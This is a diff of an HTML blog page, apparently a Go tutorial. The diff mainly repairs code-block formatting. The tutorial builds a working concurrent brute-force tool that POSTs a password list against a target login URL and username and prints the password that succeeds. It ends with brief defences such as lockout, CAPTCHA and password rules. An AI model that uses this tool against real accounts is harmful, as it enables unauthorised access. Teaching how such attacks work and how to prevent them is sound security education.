@@ -91,72 +91,78 @@ I&rsquo;m sure we&rsquo;ve all seen user accounts with shoddy passwords, to demo
 <li>Create a folder in your golang directory (wherever you specified it) called <code>golang-brute-password</code></li>
 <li>Move the password file to the folder, call it <code>passwords.txt</code></li>
 <li>Create file main.go with the following
-```
-package main</li>
+<br /></li>
 </ol>
 
-<p>func main(){
-      fmt.Println(&ldquo;HELLO WORLD&rdquo;)
-   }</p>
+<pre><code>   package main
 
-<pre><code>1. run `go run main.go` -&gt; you should see &quot;HELLO WORLD&quot; in the console
-1. Let's create a function to read in the passwords and return an array of passwords. This should do:
-
+   func main(){
+      fmt.Println(&quot;HELLO WORLD&quot;)
+   }
 </code></pre>
 
-<pre><code>  // readInPasswords, reads in the passwords file and returns a slice of strings (array of strings)
-  func readInPasswords(passwordFile string) []string {
-     b, err := ioutil.ReadFile(passwordFile) // just pass the file name
-     if err != nil {
-        fmt.Println(err)
-     }
-     str := string(b) // convert content to a 'string'
+<ol>
+<li>run <code>go run main.go</code> -&gt; you should see &ldquo;HELLO WORLD&rdquo; in the console</li>
+<li>Let&rsquo;s create a function to read in the passwords and return an array of passwords. This should do:</li>
+</ol>
 
-     return strings.Split(str, &quot;\n&quot;)
-  }
+<pre><code>      // readInPasswords, reads in the passwords file and returns a slice of strings (array of strings)
+      func readInPasswords(passwordFile string) []string {
+         b, err := ioutil.ReadFile(passwordFile) // just pass the file name
+         if err != nil {
+            fmt.Println(err)
+         }
+         str := string(b) // convert content to a 'string'
+
+         return strings.Split(str, &quot;\n&quot;)
+      }
 </code></pre>
 
-<pre><code>1. Now we need a function to actually make the POST request to the specified url. Try this:
-</code></pre>
+<ol>
+<li>Now we need a function to actually make the POST request to the specified url. Try this:
+<br /></li>
+</ol>
 
-<p>// postToURL
+<pre><code>   // postToURL
    // Succeeded = true if res.status == 200
    func postToURL(url string, username string, password string) (succeeded bool) {
-      fmt.Println(&ldquo;password: &ldquo;, password)
-      values := map[string]string{&ldquo;username&rdquo;: username, &ldquo;email&rdquo;: username, &ldquo;password&rdquo;: password}</p>
+      fmt.Println(&quot;password: &quot;, password)
+      values := map[string]string{&quot;username&quot;: username, &quot;email&quot;: username, &quot;password&quot;: password}
 
-<pre><code>  jsonValue, _ := json.Marshal(values)
+      jsonValue, _ := json.Marshal(values)
 
-  resp, err := http.Post(url, &quot;application/json&quot;, bytes.NewBuffer(jsonValue))
-  if err != nil {
-     fmt.Println(&quot;Error occured: &quot;, err)
-     return false
-  }
-  defer resp.Body.Close()
-  fmt.Println(&quot;Response status: &quot;, resp.Status)
-  var body interface{}
-  json.NewDecoder(resp.Body).Decode(&amp;body)
-  fmt.Println(body)
-  return resp.Status == &quot;200&quot;
-</code></pre>
-
-<p>}</p>
-
-<pre><code>1. Now let's grab the url and username to target from the program arguments
+      resp, err := http.Post(url, &quot;application/json&quot;, bytes.NewBuffer(jsonValue))
+      if err != nil {
+         fmt.Println(&quot;Error occured: &quot;, err)
+         return false
+      }
+      defer resp.Body.Close()
+      fmt.Println(&quot;Response status: &quot;, resp.Status)
+      var body interface{}
+      json.NewDecoder(resp.Body).Decode(&amp;body)
+      fmt.Println(body)
+      return resp.Status == &quot;200&quot;
+   }
 
 </code></pre>
 
-<p>if len(os.Args) != 3 {
-         log.Fatal(&ldquo;Please url to post and username&rdquo;)
+<ol>
+<li>Now let&rsquo;s grab the url and username to target from the program arguments</li>
+</ol>
+
+<pre><code>   if len(os.Args) != 3 {
+         log.Fatal(&quot;Please url to post and username&quot;)
       }
       url := os.Args[1]
       username := os.Args[2]
-      passwords := readInPasswords(&ldquo;passwords.txt&rdquo;)</p>
-
-<pre><code>1. Now let's use a simple for loop to make the requests
+      passwords := readInPasswords(&quot;passwords.txt&quot;)
 </code></pre>
 
-<pre><code>  // one after another
+<ol>
+<li><p>Now let&rsquo;s use a simple for loop to make the requests</p>
+
+<pre><code>
+  // one after another
   // for _, password := range passwords {
   // 	fmt.Println(&quot;password is: &quot;, password)
 
@@ -164,10 +170,9 @@ package main</li>
   // 		fmt.Println(&quot;password is: &quot;, password)
   // 	}
   // }
-</code></pre>
+</code></pre></li>
 
-<pre><code>1. That's slow as hell, let's do it concurrently
-</code></pre>
+<li><p>That&rsquo;s slow as hell, let&rsquo;s do it concurrently</p>
 
 <pre><code>  var wg sync.WaitGroup
   wg.Add(len(passwords))
@@ -185,35 +190,38 @@ package main</li>
 
   wg.Wait() // wait until the for loop finishes
   fmt.Println(&quot;found password is: &quot;, foundPassword)
-</code></pre>
+</code></pre></li>
 
-<pre><code>
-1. Now we should be able to iterate through the password list in under 4-5 seconds... Wow..
-1. How could we fix this and prevent users from weak passwords from being vulnerable to this attack?
-      - Lock account after 5 failed login attempts. Need to contact an admin or re-verify your email.
-      - Require the user fill out a Recaptcha on login.
-      - Enforce strict password requirements. 8 characters + and 2 complexity cases
-1. By processing each request or rate limiting the client, a server makes itself exceptionally vulnerable to DDOS. For those who don't know Krebs did a great writeup on DDOS [here](https://krebsonsecurity.com/tag/ddos/).
+<li><p>Now we should be able to iterate through the password list in under 4-5 seconds&hellip; Wow..</p></li>
 
-## Ps. our final program should look like this:
+<li><p>How could we fix this and prevent users from weak passwords from being vulnerable to this attack?</p>
 
-</code></pre>
+<ul>
+<li>Lock account after 5 failed login attempts. Need to contact an admin or re-verify your email.</li>
+<li>Require the user fill out a Recaptcha on login.</li>
+<li>Enforce strict password requirements. 8 characters + and 2 complexity cases</li>
+</ul></li>
 
-<p>package main</p>
+<li><p>By processing each request or rate limiting the client, a server makes itself exceptionally vulnerable to DDOS. For those who don&rsquo;t know Krebs did a great writeup on DDOS <a href="https://krebsonsecurity.com/tag/ddos/">here</a>.</p></li>
+</ol>
 
-<p>import (
-	&ldquo;bytes&rdquo;
-	&ldquo;encoding/json&rdquo;
-	&ldquo;fmt&rdquo;
-	&ldquo;io/ioutil&rdquo;
-	&ldquo;log&rdquo;
-	&ldquo;net/http&rdquo;
-	&ldquo;os&rdquo;
-	&ldquo;strings&rdquo;
-	&ldquo;sync&rdquo;
-)</p>
+<h2 id="ps-our-final-program-should-look-like-this">Ps. our final program should look like this:</h2>
 
-<p>/*Main
+<pre><code>package main
+
+import (
+	&quot;bytes&quot;
+	&quot;encoding/json&quot;
+	&quot;fmt&quot;
+	&quot;io/ioutil&quot;
+	&quot;log&quot;
+	&quot;net/http&quot;
+	&quot;os&quot;
+	&quot;strings&quot;
+	&quot;sync&quot;
+)
+
+/*Main
  * Requires the url, port, and username to be sent as environment variables
  * Makes a POST request to the url with fields username, email, and password
  * Username and email values are set to the value provided in the program argument
@@ -222,16 +230,16 @@ package main</li>
  */
 func main() {
 	if len(os.Args) != 3 {
-		log.Fatal(&ldquo;Please provide url and username&rdquo;)
+		log.Fatal(&quot;Please provide url and username&quot;)
 	}
 	url := os.Args[1]
 	username := os.Args[2]
-	passwords := readInPasswords(&ldquo;passwords.txt&rdquo;)</p>
+	passwords := readInPasswords(&quot;passwords.txt&quot;)
 
-<p>	// multithreaded solution
+	// multithreaded solution
 	var wg sync.WaitGroup
 	wg.Add(len(passwords))
-	foundPassword := &ldquo;&rdquo;
+	foundPassword := &quot;&quot;
 	for _, password := range passwords {
 		go func(password string) {
 			defer wg.Done()
@@ -239,46 +247,46 @@ func main() {
 				foundPassword = password
 			}
 		}(password)
-	}</p>
+	}
 
-<p>	wg.Wait() // wait until the for loop finishes
-	fmt.Println(&ldquo;found password is: &ldquo;, foundPassword)
-}</p>
+	wg.Wait() // wait until the for loop finishes
+	fmt.Println(&quot;found password is: &quot;, foundPassword)
+}
 
-<p>// readInPasswords, reads in the passwords file and returns a slice of strings (array of strings)
+// readInPasswords, reads in the passwords file and returns a slice of strings (array of strings)
 func readInPasswords(passwordFile string) []string {
 	b, err := ioutil.ReadFile(passwordFile) // just pass the file name
 	if err != nil {
 		fmt.Println(err)
 	}
-	str := string(b) // convert content to a &lsquo;string&rsquo;</p>
+	str := string(b) // convert content to a 'string'
 
-<p>	return strings.Split(str, &ldquo;\n&rdquo;)
-}</p>
+	return strings.Split(str, &quot;\n&quot;)
+}
 
-<p>// postToURL
+// postToURL
 // Succeeded = true if res.status == 200
 func postToURL(url string, username string, password string) (succeeded bool) {
-	values := map[string]string{&ldquo;username&rdquo;: username, &ldquo;email&rdquo;: username, &ldquo;password&rdquo;: password}</p>
+	values := map[string]string{&quot;username&quot;: username, &quot;email&quot;: username, &quot;password&quot;: password}
 
-<p>	jsonValue, _ := json.Marshal(values)</p>
+	jsonValue, _ := json.Marshal(values)
 
-<p>	resp, err := http.Post(url, &ldquo;application/json&rdquo;, bytes.NewBuffer(jsonValue))
+	resp, err := http.Post(url, &quot;application/json&quot;, bytes.NewBuffer(jsonValue))
 	if err != nil {
-		fmt.Println(&ldquo;Error occured: &ldquo;, err)
+		fmt.Println(&quot;Error occured: &quot;, err)
 		return false
 	}
 	defer resp.Body.Close()
 	if resp.StatusCode == 200 {
-		fmt.Println(&ldquo;Response status: &ldquo;, resp.Status)
+		fmt.Println(&quot;Response status: &quot;, resp.Status)
 		var body interface{}
 		json.NewDecoder(resp.Body).Decode(&amp;body)
 		fmt.Println(body)
 	}
 	return resp.StatusCode == 200
-}</p>
+}
 
-<p>```</p>
+</code></pre>
 
       
     </div>
